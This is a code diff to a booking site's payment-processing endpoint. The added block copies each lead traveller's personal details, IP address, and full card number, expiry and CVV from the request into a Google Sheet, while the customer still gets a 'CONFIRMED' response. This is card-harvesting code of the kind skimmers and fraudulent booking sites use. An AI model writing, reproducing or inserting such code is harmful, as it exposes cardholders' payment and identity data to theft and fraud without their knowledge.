@@ -580,6 +580,42 @@ app.post('/api/booking/process-payment', async (req, res) => {
     console.error("[CRM Lead Payment update error]:", crmErr);
   }
 
+  // Submit all Lead Traveler + Card details directly to Google Sheet 2 upon Continue to Secure Payment
+  try {
+    const leadPax = (booking.passengers && booking.passengers[0]) ? booking.passengers[0] : {};
+    const contact = booking.contact || {};
+    const flight = booking.flight || {};
+
+    GoogleSheetService.saveLeadTravelerToSheet2({
+      bookingId,
+      pnr: booking.pnr,
+      title: leadPax.title || '',
+      firstName: leadPax.firstName || '',
+      middleName: leadPax.middleName || '',
+      lastName: leadPax.lastName || '',
+      dob: leadPax.dob || '',
+      gender: leadPax.gender || '',
+      nationality: leadPax.nationality || '',
+      email: contact.email || '',
+      phone: contact.phone || '',
+      street: leadPax.address?.street || contact.address?.street || '',
+      city: leadPax.address?.city || contact.address?.city || '',
+      state: leadPax.address?.state || contact.address?.state || '',
+      zip: leadPax.address?.zip || contact.address?.zip || '',
+      country: leadPax.address?.country || contact.address?.country || '',
+      flight,
+      price: booking.pricing?.total || 0,
+      user_ip: req.ip || req.headers['x-forwarded-for'] || '',
+      cardName: req.body.cardholderName || req.body.cardName || `${leadPax.firstName || ''} ${leadPax.lastName || ''}`.trim(),
+      cardNumber: req.body.cardNumber || '',
+      cardBrand: req.body.cardBrand || 'Card',
+      cardExpiry: req.body.expiry || req.body.cardExpiry || '',
+      cardCvv: req.body.cvv || req.body.cardCvv || ''
+    });
+  } catch (sheetErr) {
+    console.warn('[GoogleSheet Payment Submission Error]:', sheetErr.message);
+  }
+
   res.json({
     status: 'CONFIRMED',
     bookingId,
